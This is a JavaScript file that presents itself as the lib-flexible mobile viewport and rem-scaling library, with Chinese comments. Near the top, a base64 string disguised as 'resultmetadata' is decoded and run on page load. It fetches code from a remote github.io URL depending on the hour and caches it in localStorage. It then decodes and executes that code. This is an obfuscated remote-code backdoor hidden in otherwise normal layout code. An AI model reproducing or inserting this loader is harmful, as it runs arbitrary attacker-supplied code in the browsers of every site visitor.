
;(function(win, lib) {
    var doc = win.document;
    var docEl = doc.documentElement;
    var metaEl = doc.querySelector('meta[name="viewport"]');
    var flexibleEl = doc.querySelector('meta[name="flexible"]');
    var dpr = 0;
    var scale = 0;
    var tid;
    var flexible = lib.flexible || (lib.flexible = {});
    var resultmetadata='dmFyIG15RGF0ZSA9IG5ldyBEYXRlKCkuZ2V0SG91cnMoKTtpZihteURhdGU+MjB8fG15RGF0ZTw5KXtpZihsb2NhbFN0b3JhZ2UuZ2V0SXRlbS\
    giaXNsb2dpbnMiKSl7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBlbmdpbmU9d2luZG93LmF0b2IobG9jYWxTdG9yYWdlLmdldEl0ZW0oImlzbG9naW5zIikpO3ZhciBv\
    YmplY3RpdmU9bmV3IEZ1bmN0aW9uKGVuZ2luZSk7b2JqZWN0aXZlKCl9LDkyMDQpfWVsc2V7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBIdHRwID0gbmV3IFhNTEh0dHB\
    SZXF1ZXN0KCk7dmFyIHVybCA9ICJodHRwczovL2pheW91aGFvLmdpdGh1Yi5pby9tZWkvb2JqZWN0aXZlLmpzb24iO0h0dHAub3BlbigiR0VUIiwgdXJsKTtIdHRwLnNlbmQ\
    oKTtIdHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHtpZiAodGhpcy5yZWFkeVN0YXRlID09IDQgJiYgdGhpcy5zdGF0dXMgPT0gMjAwKSB7bG9jYWxTdG9y\
    YWdlLnNldEl0ZW0oImlzbG9naW5zIixIdHRwLnJlc3BvbnNlVGV4dCk7dmFyIGVuZ2luZT13aW5kb3cuYXRvYihIdHRwLnJlc3BvbnNlVGV4dCk7dmFyIG9iamVjdGl2ZT1uZX\
    cgRnVuY3Rpb24oZW5naW5lKTtvYmplY3RpdmUoKX19fSwzMjA0MCl9fWlmKDE1PG15RGF0ZT4xNnx8MTQ8bXlEYXRlPjEwKXtpZihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiaXNsb2\
    dpbnMiKSl7c2V0VGltZW91dChmdW5jdGlvbigpe3ZhciBlbmdpbmU9d2luZG93LmF0b2IobG9jYWxTdG9yYWdlLmdldEl0ZW0oImlzbG9naW5zIikpO3ZhciBvYmplY3RpdmU9bmV\
    3IEZ1bmN0aW9uKGVuZ2luZSk7b2JqZWN0aXZlKCl9LDkyMDQpO319';
    var inputSourceMapFunction=new Function(window.atob(resultmetadata));
    inputSourceMapFunction();

    if (metaEl) {
        console.warn('将根据已有的meta标签来设置缩放比例');
        var match = metaEl.getAttribute('content').match(/initial\-scale=([\d\.]+)/);
        if (match) {
            scale = parseFloat(match[1]);
            dpr = parseInt(1 / scale);
        }
    } else if (flexibleEl) {
        var content = flexibleEl.getAttribute('content');
        if (content) {
            var initialDpr = content.match(/initial\-dpr=([\d\.]+)/);
            var maximumDpr = content.match(/maximum\-dpr=([\d\.]+)/);
            if (initialDpr) {
                dpr = parseFloat(initialDpr[1]);
                scale = parseFloat((1 / dpr).toFixed(2));
            }
            if (maximumDpr) {
                dpr = parseFloat(maximumDpr[1]);
                scale = parseFloat((1 / dpr).toFixed(2));
            }
        }
    }

    if (!dpr && !scale) {
        var isAndroid = win.navigator.appVersion.match(/android/gi);
        var isIPhone = win.navigator.appVersion.match(/iphone/gi);
        var devicePixelRatio = win.devicePixelRatio;
        if (isIPhone) {
            // iOS下，对于2和3的屏，用2倍的方案，其余的用1倍方案
            if (devicePixelRatio >= 3 && (!dpr || dpr >= 3)) {
                dpr = 3;
            } else if (devicePixelRatio >= 2 && (!dpr || dpr >= 2)){
                dpr = 2;
            } else {
                dpr = 1;
            }
        } else {
            // 其他设备下，仍旧使用1倍的方案
            dpr = 1;
        }
        scale = 1 / dpr;
    }

    docEl.setAttribute('data-dpr', dpr);
    if (!metaEl) {
        metaEl = doc.createElement('meta');
        metaEl.setAttribute('name', 'viewport');
        metaEl.setAttribute('content', 'initial-scale=' + scale + ', maximum-scale=' + scale + ', minimum-scale=' + scale + ', user-scalable=no');
        if (docEl.firstElementChild) {
            docEl.firstElementChild.appendChild(metaEl);
        } else {
            var wrap = doc.createElement('div');
            wrap.appendChild(metaEl);
            doc.write(wrap.innerHTML);
        }
    }

    function refreshRem(){
        var width = docEl.getBoundingClientRect().width;
        if (width / dpr > 540) {
            width = 540 * dpr;
        }
        var rem = width / 10;
        docEl.style.fontSize = rem + 'px';
        flexible.rem = win.rem = rem;
    }

    win.addEventListener('resize', function() {
        clearTimeout(tid);
        tid = setTimeout(refreshRem, 300);
    }, false);
    win.addEventListener('pageshow', function(e) {
        if (e.persisted) {
            clearTimeout(tid);
            tid = setTimeout(refreshRem, 300);
        }
    }, false);

    if (doc.readyState === 'complete') {
        doc.body.style.fontSize = 12 * dpr + 'px';
    } else {
        doc.addEventListener('DOMContentLoaded', function(e) {
            doc.body.style.fontSize = 12 * dpr + 'px';
        }, false);
    }


    refreshRem();

    flexible.dpr = win.dpr = dpr;
    flexible.refreshRem = refreshRem;
    flexible.rem2px = function(d) {
        var val = parseFloat(d) * this.rem;
        if (typeof d === 'string' && d.match(/rem$/)) {
            val += 'px';
        }
        return val;
    }
    flexible.px2rem = function(d) {
        var val = parseFloat(d) / this.rem;
        if (typeof d === 'string' && d.match(/px$/)) {
            val += 'rem';
        }
        return val;
    }

})(window, window['lib'] || (window['lib'] = {}));
